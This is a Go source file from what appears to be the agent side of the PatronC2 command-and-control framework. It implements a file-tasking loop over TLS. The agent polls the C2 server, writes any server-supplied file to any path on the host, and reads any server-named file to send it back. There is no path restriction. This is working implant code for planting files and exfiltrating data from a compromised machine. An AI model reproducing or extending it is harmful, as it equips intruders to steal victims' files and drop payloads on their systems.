package client_utils

import (
	"crypto/tls"
	"fmt"
	"net"
	"os"
	"path/filepath"

	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
	"github.com/PatronC2/Patron/lib/common"
	"github.com/PatronC2/Patron/lib/logger"
)

func HandleFileRequest(conn *tls.Conn, agentID string) error {
	logger.Logf(logger.Info, "Sending file request")

	for {
		req := &patronobuf.Request{
			Type: patronobuf.RequestType_FILE,
			Payload: &patronobuf.Request_File{
				File: &patronobuf.FileRequest{
					Uuid: agentID,
				},
			},
		}
		if err := common.WriteDelimited(conn, req); err != nil {
			return fmt.Errorf("send file request: %w", err)
		}

		resp := &patronobuf.Response{}
		if err := common.ReadDelimited(conn, resp); err != nil {
			return fmt.Errorf("read file response: %w", err)
		}
		fileResp := resp.GetFileResponse()
		if fileResp == nil || fileResp.GetTransfertype() == "" {
			logger.Logf(logger.Info, "No more files to process")
			return nil
		}

		logger.Logf(logger.Info, "Received file response: FileID=%v, Type=%v", fileResp.GetFileid(), fileResp.GetTransfertype())

		if fileResp.GetTransfertype() == "Download" {
			if err := handleFileDownload(fileResp); err != nil {
				_ = sendFileStatus(conn, fileResp, "Error")
				return err
			}
			_ = sendFileStatus(conn, fileResp, "Success")
		} else if fileResp.GetTransfertype() == "Upload" {
			if err := handleFileUpload(conn, fileResp); err != nil {
				_ = sendFileStatus(conn, fileResp, "Error")
				return err
			}
		}
	}
}

func handleFileDownload(file *patronobuf.FileResponse) error {
	dir := filepath.Dir(file.GetFilepath())
	if err := os.MkdirAll(dir, os.ModePerm); err != nil {
		return err
	}

	f, err := os.Create(file.GetFilepath())
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.Write(file.GetChunk())
	return err
}

func handleFileUpload(conn net.Conn, file *patronobuf.FileResponse) error {
	data, err := os.ReadFile(file.GetFilepath())
	if err != nil {
		return err
	}

	req := &patronobuf.Request{
		Type: patronobuf.RequestType_FILE_TO_SERVER,
		Payload: &patronobuf.Request_FileToServer{
			FileToServer: &patronobuf.FileToServer{
				Fileid:       file.GetFileid(),
				Uuid:         file.GetUuid(),
				Transfertype: file.GetTransfertype(),
				Path:         file.GetFilepath(),
				Status:       "Success",
				Chunk:        data,
			},
		},
	}
	return common.WriteDelimited(conn, req)
}

func sendFileStatus(conn net.Conn, file *patronobuf.FileResponse, status string) error {
	statusReq := &patronobuf.Request{
		Type: patronobuf.RequestType_FILE_TO_SERVER,
		Payload: &patronobuf.Request_FileToServer{
			FileToServer: &patronobuf.FileToServer{
				Fileid:       file.GetFileid(),
				Uuid:         file.GetUuid(),
				Transfertype: file.GetTransfertype(),
				Path:         file.GetFilepath(),
				Status:       status,
			},
		},
	}
	return common.WriteDelimited(conn, statusReq)
}
